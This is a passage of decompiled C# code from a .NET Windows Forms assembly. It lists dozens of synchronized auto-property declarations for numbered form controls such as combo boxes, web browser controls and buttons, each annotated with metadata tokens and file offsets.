		internal virtual ComboBox ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x06000043 RID: 67 RVA: 0x00009A7B File Offset: 0x00007C7B
		// (set) Token: 0x06000044 RID: 68 RVA: 0x00009A83 File Offset: 0x00007C83
		internal virtual CheckedListBox CheckedListBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000045 RID: 69 RVA: 0x00009A8C File Offset: 0x00007C8C
		// (set) Token: 0x06000046 RID: 70 RVA: 0x00009A94 File Offset: 0x00007C94
		internal virtual CheckedListBox CheckedListBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x06000047 RID: 71 RVA: 0x00009A9D File Offset: 0x00007C9D
		// (set) Token: 0x06000048 RID: 72 RVA: 0x00009AA5 File Offset: 0x00007CA5
		internal virtual ComboBox ComboBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x06000049 RID: 73 RVA: 0x00009AAE File Offset: 0x00007CAE
		// (set) Token: 0x0600004A RID: 74 RVA: 0x00009AB6 File Offset: 0x00007CB6
		internal virtual ListBox ListBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x0600004B RID: 75 RVA: 0x00009ABF File Offset: 0x00007CBF
		// (set) Token: 0x0600004C RID: 76 RVA: 0x00009AC7 File Offset: 0x00007CC7
		internal virtual LinkLabel LinkLabel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x0600004D RID: 77 RVA: 0x00009AD0 File Offset: 0x00007CD0
		// (set) Token: 0x0600004E RID: 78 RVA: 0x00009AD8 File Offset: 0x00007CD8
		internal virtual MaskedTextBox MaskedTextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x0600004F RID: 79 RVA: 0x00009AE1 File Offset: 0x00007CE1
		// (set) Token: 0x06000050 RID: 80 RVA: 0x00009AE9 File Offset: 0x00007CE9
		internal virtual ProgressBar ProgressBar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x06000051 RID: 81 RVA: 0x00009AF2 File Offset: 0x00007CF2
		// (set) Token: 0x06000052 RID: 82 RVA: 0x00009AFA File Offset: 0x00007CFA
		internal virtual PictureBox PictureBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x06000053 RID: 83 RVA: 0x00009B03 File Offset: 0x00007D03
		// (set) Token: 0x06000054 RID: 84 RVA: 0x00009B0B File Offset: 0x00007D0B
		internal virtual PictureBox PictureBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x06000055 RID: 85 RVA: 0x00009B14 File Offset: 0x00007D14
		// (set) Token: 0x06000056 RID: 86 RVA: 0x00009B1C File Offset: 0x00007D1C
		internal virtual WebBrowser WebBrowser2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x06000057 RID: 87 RVA: 0x00009B25 File Offset: 0x00007D25
		// (set) Token: 0x06000058 RID: 88 RVA: 0x00009B2D File Offset: 0x00007D2D
		internal virtual TextBox TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002E RID: 46
		// (get) Token: 0x06000059 RID: 89 RVA: 0x00009B36 File Offset: 0x00007D36
		// (set) Token: 0x0600005A RID: 90 RVA: 0x00009B3E File Offset: 0x00007D3E
		internal virtual RichTextBox RichTextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002F RID: 47
		// (get) Token: 0x0600005B RID: 91 RVA: 0x00009B47 File Offset: 0x00007D47
		// (set) Token: 0x0600005C RID: 92 RVA: 0x00009B4F File Offset: 0x00007D4F
		internal virtual RadioButton RadioButton2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000030 RID: 48
		// (get) Token: 0x0600005D RID: 93 RVA: 0x00009B58 File Offset: 0x00007D58
		// (set) Token: 0x0600005E RID: 94 RVA: 0x00009B60 File Offset: 0x00007D60
		internal virtual NumericUpDown NumericUpDown2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x0600005F RID: 95 RVA: 0x00009B69 File Offset: 0x00007D69
		// (set) Token: 0x06000060 RID: 96 RVA: 0x00009B71 File Offset: 0x00007D71
		internal virtual MonthCalendar MonthCalendar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x06000061 RID: 97 RVA: 0x00009B7A File Offset: 0x00007D7A
		// (set) Token: 0x06000062 RID: 98 RVA: 0x00009B82 File Offset: 0x00007D82
		internal virtual MaskedTextBox MaskedTextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x06000063 RID: 99 RVA: 0x00009B8B File Offset: 0x00007D8B
		// (set) Token: 0x06000064 RID: 100 RVA: 0x00009B93 File Offset: 0x00007D93
		internal virtual ListView ListView2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x06000065 RID: 101 RVA: 0x00009B9C File Offset: 0x00007D9C
		// (set) Token: 0x06000066 RID: 102 RVA: 0x00009BA4 File Offset: 0x00007DA4
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000035 RID: 53
		// (get) Token: 0x06000067 RID: 103 RVA: 0x00009BAD File Offset: 0x00007DAD
		// (set) Token: 0x06000068 RID: 104 RVA: 0x00009BB5 File Offset: 0x00007DB5
		internal virtual ComboBox ComboBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000036 RID: 54
		// (get) Token: 0x06000069 RID: 105 RVA: 0x00009BBE File Offset: 0x00007DBE
		// (set) Token: 0x0600006A RID: 106 RVA: 0x00009BC6 File Offset: 0x00007DC6
		internal virtual DateTimePicker DateTimePicker2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x0600006B RID: 107 RVA: 0x00009BCF File Offset: 0x00007DCF
		// (set) Token: 0x0600006C RID: 108 RVA: 0x00009BD7 File Offset: 0x00007DD7
		internal virtual CheckedListBox CheckedListBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x0600006D RID: 109 RVA: 0x00009BE0 File Offset: 0x00007DE0
		// (set) Token: 0x0600006E RID: 110 RVA: 0x00009BE8 File Offset: 0x00007DE8
		internal virtual CheckBox CheckBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x0600006F RID: 111 RVA: 0x00009BF1 File Offset: 0x00007DF1
		// (set) Token: 0x06000070 RID: 112 RVA: 0x00009BF9 File Offset: 0x00007DF9
		internal virtual Button Button2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x06000071 RID: 113 RVA: 0x00009C02 File Offset: 0x00007E02
		// (set) Token: 0x06000072 RID: 114 RVA: 0x00009C0A File Offset: 0x00007E0A
		internal virtual CheckedListBox CheckedListBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x06000073 RID: 115 RVA: 0x00009C13 File Offset: 0x00007E13
		// (set) Token: 0x06000074 RID: 116 RVA: 0x00009C1B File Offset: 0x00007E1B
		internal virtual ComboBox ComboBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x06000075 RID: 117 RVA: 0x00009C24 File Offset: 0x00007E24
		// (set) Token: 0x06000076 RID: 118 RVA: 0x00009C2C File Offset: 0x00007E2C
		internal virtual ListBox ListBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x06000077 RID: 119 RVA: 0x00009C35 File Offset: 0x00007E35
		// (set) Token: 0x06000078 RID: 120 RVA: 0x00009C3D File Offset: 0x00007E3D
		internal virtual LinkLabel LinkLabel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x06000079 RID: 121 RVA: 0x00009C46 File Offset: 0x00007E46
		// (set) Token: 0x0600007A RID: 122 RVA: 0x00009C4E File Offset: 0x00007E4E
		internal virtual MaskedTextBox MaskedTextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x0600007B RID: 123 RVA: 0x00009C57 File Offset: 0x00007E57
		// (set) Token: 0x0600007C RID: 124 RVA: 0x00009C5F File Offset: 0x00007E5F
		internal virtual ProgressBar ProgressBar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x0600007D RID: 125 RVA: 0x00009C68 File Offset: 0x00007E68
		// (set) Token: 0x0600007E RID: 126 RVA: 0x00009C70 File Offset: 0x00007E70
		internal virtual PictureBox PictureBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x0600007F RID: 127 RVA: 0x00009C79 File Offset: 0x00007E79
		// (set) Token: 0x06000080 RID: 128 RVA: 0x00009C81 File Offset: 0x00007E81
		internal virtual PictureBox PictureBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x06000081 RID: 129 RVA: 0x00009C8A File Offset: 0x00007E8A
		// (set) Token: 0x06000082 RID: 130 RVA: 0x00009C92 File Offset: 0x00007E92
		internal virtual WebBrowser WebBrowser3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x06000083 RID: 131 RVA: 0x00009C9B File Offset: 0x00007E9B
		// (set) Token: 0x06000084 RID: 132 RVA: 0x00009CA3 File Offset: 0x00007EA3
		internal virtual TextBox TextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x06000085 RID: 133 RVA: 0x00009CAC File Offset: 0x00007EAC
		// (set) Token: 0x06000086 RID: 134 RVA: 0x00009CB4 File Offset: 0x00007EB4
		internal virtual RichTextBox RichTextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x06000087 RID: 135 RVA: 0x00009CBD File Offset: 0x00007EBD
		// (set) Token: 0x06000088 RID: 136 RVA: 0x00009CC5 File Offset: 0x00007EC5
		internal virtual RadioButton RadioButton3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x06000089 RID: 137 RVA: 0x00009CCE File Offset: 0x00007ECE
		// (set) Token: 0x0600008A RID: 138 RVA: 0x00009CD6 File Offset: 0x00007ED6
		internal virtual NumericUpDown NumericUpDown3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x0600008B RID: 139 RVA: 0x00009CDF File Offset: 0x00007EDF
		// (set) Token: 0x0600008C RID: 140 RVA: 0x00009CE7 File Offset: 0x00007EE7
		internal virtual MonthCalendar MonthCalendar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x0600008D RID: 141 RVA: 0x00009CF0 File Offset: 0x00007EF0
		// (set) Token: 0x0600008E RID: 142 RVA: 0x00009CF8 File Offset: 0x00007EF8
		internal virtual MaskedTextBox MaskedTextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x0600008F RID: 143 RVA: 0x00009D01 File Offset: 0x00007F01
		// (set) Token: 0x06000090 RID: 144 RVA: 0x00009D09 File Offset: 0x00007F09
		internal virtual ListView ListView3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x06000091 RID: 145 RVA: 0x00009D12 File Offset: 0x00007F12
		// (set) Token: 0x06000092 RID: 146 RVA: 0x00009D1A File Offset: 0x00007F1A
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x06000093 RID: 147 RVA: 0x00009D23 File Offset: 0x00007F23
		// (set) Token: 0x06000094 RID: 148 RVA: 0x00009D2B File Offset: 0x00007F2B
		internal virtual ComboBox ComboBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004C RID: 76
		// (get) Token: 0x06000095 RID: 149 RVA: 0x00009D34 File Offset: 0x00007F34
		// (set) Token: 0x06000096 RID: 150 RVA: 0x00009D3C File Offset: 0x00007F3C
		internal virtual DateTimePicker DateTimePicker3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004D RID: 77
		// (get) Token: 0x06000097 RID: 151 RVA: 0x00009D45 File Offset: 0x00007F45
		// (set) Token: 0x06000098 RID: 152 RVA: 0x00009D4D File Offset: 0x00007F4D
		internal virtual CheckedListBox CheckedListBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004E RID: 78
		// (get) Token: 0x06000099 RID: 153 RVA: 0x00009D56 File Offset: 0x00007F56
		// (set) Token: 0x0600009A RID: 154 RVA: 0x00009D5E File Offset: 0x00007F5E
		internal virtual CheckBox CheckBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004F RID: 79
		// (get) Token: 0x0600009B RID: 155 RVA: 0x00009D67 File Offset: 0x00007F67
		// (set) Token: 0x0600009C RID: 156 RVA: 0x00009D6F File Offset: 0x00007F6F
		internal virtual Button Button3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000050 RID: 80
		// (get) Token: 0x0600009D RID: 157 RVA: 0x00009D78 File Offset: 0x00007F78
		// (set) Token: 0x0600009E RID: 158 RVA: 0x00009D80 File Offset: 0x00007F80
		internal virtual CheckedListBox CheckedListBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000051 RID: 81
		// (get) Token: 0x0600009F RID: 159 RVA: 0x00009D89 File Offset: 0x00007F89
		// (set) Token: 0x060000A0 RID: 160 RVA: 0x00009D91 File Offset: 0x00007F91
		internal virtual ComboBox ComboBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000052 RID: 82
		// (get) Token: 0x060000A1 RID: 161 RVA: 0x00009D9A File Offset: 0x00007F9A
		// (set) Token: 0x060000A2 RID: 162 RVA: 0x00009DA2 File Offset: 0x00007FA2
		internal virtual ListBox ListBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000053 RID: 83
		// (get) Token: 0x060000A3 RID: 163 RVA: 0x00009DAB File Offset: 0x00007FAB
		// (set) Token: 0x060000A4 RID: 164 RVA: 0x00009DB3 File Offset: 0x00007FB3
		internal virtual LinkLabel LinkLabel4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000054 RID: 84
		// (get) Token: 0x060000A5 RID: 165 RVA: 0x00009DBC File Offset: 0x00007FBC
		// (set) Token: 0x060000A6 RID: 166 RVA: 0x00009DC4 File Offset: 0x00007FC4
		internal virtual MaskedTextBox MaskedTextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000055 RID: 85
		// (get) Token: 0x060000A7 RID: 167 RVA: 0x00009DCD File Offset: 0x00007FCD
		// (set) Token: 0x060000A8 RID: 168 RVA: 0x00009DD5 File Offset: 0x00007FD5
		internal virtual ProgressBar ProgressBar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000056 RID: 86
		// (get) Token: 0x060000A9 RID: 169 RVA: 0x00009DDE File Offset: 0x00007FDE
		// (set) Token: 0x060000AA RID: 170 RVA: 0x00009DE6 File Offset: 0x00007FE6
		internal virtual PictureBox PictureBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x060000AB RID: 171 RVA: 0x00009DEF File Offset: 0x00007FEF
		// (set) Token: 0x060000AC RID: 172 RVA: 0x00009DF7 File Offset: 0x00007FF7
		internal virtual PictureBox PictureBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000058 RID: 88
		// (get) Token: 0x060000AD RID: 173 RVA: 0x00009E00 File Offset: 0x00008000
		// (set) Token: 0x060000AE RID: 174 RVA: 0x00009E08 File Offset: 0x00008008
		internal virtual WebBrowser WebBrowser4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000059 RID: 89
		// (get) Token: 0x060000AF RID: 175 RVA: 0x00009E11 File Offset: 0x00008011
		// (set) Token: 0x060000B0 RID: 176 RVA: 0x00009E19 File Offset: 0x00008019
		internal virtual TextBox TextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700005A RID: 90
		// (get) Token: 0x060000B1 RID: 177 RVA: 0x00009E22 File Offset: 0x00008022
		// (set) Token: 0x060000B2 RID: 178 RVA: 0x00009E2A File Offset: 0x0000802A
		internal virtual RichTextBox RichTextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700005B RID: 91
		// (get) Token: 0x060000B3 RID: 179 RVA: 0x00009E33 File Offset: 0x00008033
		// (set) Token: 0x060000B4 RID: 180 RVA: 0x00009E3B File Offset: 0x0000803B
		internal virtual RadioButton RadioButton4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700005C RID: 92
		// (get) Token: 0x060000B5 RID: 181 RVA: 0x00009E44 File Offset: 0x00008044
		// (set) Token: 0x060000B6 RID: 182 RVA: 0x00009E4C File Offset: 0x0000804C
		internal virtual NumericUpDown NumericUpDown4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700005D RID: 93
		// (get) Token: 0x060000B7 RID: 183 RVA: 0x00009E55 File Offset: 0x00008055
		// (set) Token: 0x060000B8 RID: 184 RVA: 0x00009E5D File Offset: 0x0000805D
		internal virtual MonthCalendar MonthCalendar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700005E RID: 94
		// (get) Token: 0x060000B9 RID: 185 RVA: 0x00009E66 File Offset: 0x00008066
		// (set) Token: 0x060000BA RID: 186 RVA: 0x00009E6E File Offset: 0x0000806E
		internal virtual MaskedTextBox MaskedTextBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700005F RID: 95
		// (get) Token: 0x060000BB RID: 187 RVA: 0x00009E77 File Offset: 0x00008077
		// (set) Token: 0x060000BC RID: 188 RVA: 0x00009E7F File Offset: 0x0000807F
		internal virtual ListView ListView4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000060 RID: 96
		// (get) Token: 0x060000BD RID: 189 RVA: 0x00009E88 File Offset: 0x00008088
		// (set) Token: 0x060000BE RID: 190 RVA: 0x00009E90 File Offset: 0x00008090
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000061 RID: 97
		// (get) Token: 0x060000BF RID: 191 RVA: 0x00009E99 File Offset: 0x00008099
		// (set) Token: 0x060000C0 RID: 192 RVA: 0x00009EA1 File Offset: 0x000080A1
		internal virtual ComboBox ComboBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000062 RID: 98
		// (get) Token: 0x060000C1 RID: 193 RVA: 0x00009EAA File Offset: 0x000080AA
		// (set) Token: 0x060000C2 RID: 194 RVA: 0x00009EB2 File Offset: 0x000080B2
		internal virtual DateTimePicker DateTimePicker4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000063 RID: 99
		// (get) Token: 0x060000C3 RID: 195 RVA: 0x00009EBB File Offset: 0x000080BB
		// (set) Token: 0x060000C4 RID: 196 RVA: 0x00009EC3 File Offset: 0x000080C3
		internal virtual CheckedListBox CheckedListBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000064 RID: 100
		// (get) Token: 0x060000C5 RID: 197 RVA: 0x00009ECC File Offset: 0x000080CC
		// (set) Token: 0x060000C6 RID: 198 RVA: 0x00009ED4 File Offset: 0x000080D4
		internal virtual CheckBox CheckBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000065 RID: 101
		// (get) Token: 0x060000C7 RID: 199 RVA: 0x00009EDD File Offset: 0x000080DD
		// (set) Token: 0x060000C8 RID: 200 RVA: 0x00009EE5 File Offset: 0x000080E5
		internal virtual Button Button4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x060000C9 RID: 201 RVA: 0x00009EEE File Offset: 0x000080EE
		// (set) Token: 0x060000CA RID: 202 RVA: 0x00009EF6 File Offset: 0x000080F6
		internal virtual CheckedListBox CheckedListBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x060000CB RID: 203 RVA: 0x00009EFF File Offset: 0x000080FF
		// (set) Token: 0x060000CC RID: 204 RVA: 0x00009F07 File Offset: 0x00008107
		internal virtual ComboBox ComboBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x060000CD RID: 205 RVA: 0x00009F10 File Offset: 0x00008110
		// (set) Token: 0x060000CE RID: 206 RVA: 0x00009F18 File Offset: 0x00008118
		internal virtual ListBox ListBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x060000CF RID: 207 RVA: 0x00009F21 File Offset: 0x00008121
		// (set) Token: 0x060000D0 RID: 208 RVA: 0x00009F29 File Offset: 0x00008129
		internal virtual LinkLabel LinkLabel5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x060000D1 RID: 209 RVA: 0x00009F32 File Offset: 0x00008132
		// (set) Token: 0x060000D2 RID: 210 RVA: 0x00009F3A File Offset: 0x0000813A
		internal virtual MaskedTextBox MaskedTextBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x060000D3 RID: 211 RVA: 0x00009F43 File Offset: 0x00008143
		// (set) Token: 0x060000D4 RID: 212 RVA: 0x00009F4B File Offset: 0x0000814B
		internal virtual ProgressBar ProgressBar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x060000D5 RID: 213 RVA: 0x00009F54 File Offset: 0x00008154
		// (set) Token: 0x060000D6 RID: 214 RVA: 0x00009F5C File Offset: 0x0000815C
		internal virtual PictureBox PictureBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x060000D7 RID: 215 RVA: 0x00009F65 File Offset: 0x00008165
		// (set) Token: 0x060000D8 RID: 216 RVA: 0x00009F6D File Offset: 0x0000816D
		internal virtual PictureBox PictureBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x060000D9 RID: 217 RVA: 0x00009F76 File Offset: 0x00008176
		// (set) Token: 0x060000DA RID: 218 RVA: 0x00009F7E File Offset: 0x0000817E
		internal virtual WebBrowser WebBrowser5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006F RID: 111
		// (get) Token: 0x060000DB RID: 219 RVA: 0x00009F87 File Offset: 0x00008187
		// (set) Token: 0x060000DC RID: 220 RVA: 0x00009F8F File Offset: 0x0000818F
		internal virtual TextBox TextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x060000DD RID: 221 RVA: 0x00009F98 File Offset: 0x00008198
		// (set) Token: 0x060000DE RID: 222 RVA: 0x00009FA0 File Offset: 0x000081A0
		internal virtual RichTextBox RichTextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x060000DF RID: 223 RVA: 0x00009FA9 File Offset: 0x000081A9
		// (set) Token: 0x060000E0 RID: 224 RVA: 0x00009FB1 File Offset: 0x000081B1
		internal virtual RadioButton RadioButton5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x060000E1 RID: 225 RVA: 0x00009FBA File Offset: 0x000081BA
		// (set) Token: 0x060000E2 RID: 226 RVA: 0x00009FC2 File Offset: 0x000081C2
		internal virtual NumericUpDown NumericUpDown5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x060000E3 RID: 227 RVA: 0x00009FCB File Offset: 0x000081CB
		// (set) Token: 0x060000E4 RID: 228 RVA: 0x00009FD3 File Offset: 0x000081D3
		internal virtual MonthCalendar MonthCalendar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x060000E5 RID: 229 RVA: 0x00009FDC File Offset: 0x000081DC
		// (set) Token: 0x060000E6 RID: 230 RVA: 0x00009FE4 File Offset: 0x000081E4
		internal virtual MaskedTextBox MaskedTextBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000075 RID: 117
		// (get) Token: 0x060000E7 RID: 231 RVA: 0x00009FED File Offset: 0x000081ED
		// (set) Token: 0x060000E8 RID: 232 RVA: 0x00009FF5 File Offset: 0x000081F5
		internal virtual ListView ListView5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000076 RID: 118
		// (get) Token: 0x060000E9 RID: 233 RVA: 0x00009FFE File Offset: 0x000081FE
		// (set) Token: 0x060000EA RID: 234 RVA: 0x0000A006 File Offset: 0x00008206
		internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000077 RID: 119
		// (get) Token: 0x060000EB RID: 235 RVA: 0x0000A00F File Offset: 0x0000820F
		// (set) Token: 0x060000EC RID: 236 RVA: 0x0000A017 File Offset: 0x00008217
		internal virtual ComboBox ComboBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000078 RID: 120
		// (get) Token: 0x060000ED RID: 237 RVA: 0x0000A020 File Offset: 0x00008220
		// (set) Token: 0x060000EE RID: 238 RVA: 0x0000A028 File Offset: 0x00008228
		internal virtual DateTimePicker DateTimePicker5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000079 RID: 121
		// (get) Token: 0x060000EF RID: 239 RVA: 0x0000A031 File Offset: 0x00008231
		// (set) Token: 0x060000F0 RID: 240 RVA: 0x0000A039 File Offset: 0x00008239
		internal virtual CheckedListBox CheckedListBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007A RID: 122
		// (get) Token: 0x060000F1 RID: 241 RVA: 0x0000A042 File Offset: 0x00008242
		// (set) Token: 0x060000F2 RID: 242 RVA: 0x0000A04A File Offset: 0x0000824A
		internal virtual CheckBox CheckBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007B RID: 123
		// (get) Token: 0x060000F3 RID: 243 RVA: 0x0000A053 File Offset: 0x00008253
		// (set) Token: 0x060000F4 RID: 244 RVA: 0x0000A05B File Offset: 0x0000825B
		internal virtual Button Button5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007C RID: 124
		// (get) Token: 0x060000F5 RID: 245 RVA: 0x0000A064 File Offset: 0x00008264
		// (set) Token: 0x060000F6 RID: 246 RVA: 0x0000A06C File Offset: 0x0000826C
		internal virtual CheckedListBox CheckedListBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007D RID: 125
		// (get) Token: 0x060000F7 RID: 247 RVA: 0x0000A075 File Offset: 0x00008275
		// (set) Token: 0x060000F8 RID: 248 RVA: 0x0000A07D File Offset: 0x0000827D
		internal virtual ComboBox ComboBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007E RID: 126
		// (get) Token: 0x060000F9 RID: 249 RVA: 0x0000A086 File Offset: 0x00008286
		// (set) Token: 0x060000FA RID: 250 RVA: 0x0000A08E File Offset: 0x0000828E
		internal virtual ListBox ListBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007F RID: 127
		// (get) Token: 0x060000FB RID: 251 RVA: 0x0000A097 File Offset: 0x00008297
